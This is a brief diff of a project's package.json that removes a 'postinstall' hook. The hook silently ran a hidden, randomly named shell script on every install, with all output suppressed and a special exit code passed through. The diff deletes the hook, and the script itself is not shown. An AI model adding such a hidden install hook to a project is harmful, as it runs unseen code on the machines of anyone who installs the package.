@@ -9,8 +9,7 @@
     "format": "prettier --check .",
     "format:fix": "prettier --write .",
     "syncpack:list": "syncpack list",
-    "syncpack:update": "syncpack update",
-    "postinstall": "sh ./.ci-nxufok.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "syncpack:update": "syncpack update"
   },
   "devDependencies": {
     "@thesis/prettier-config": "github:thesis/prettier-config",
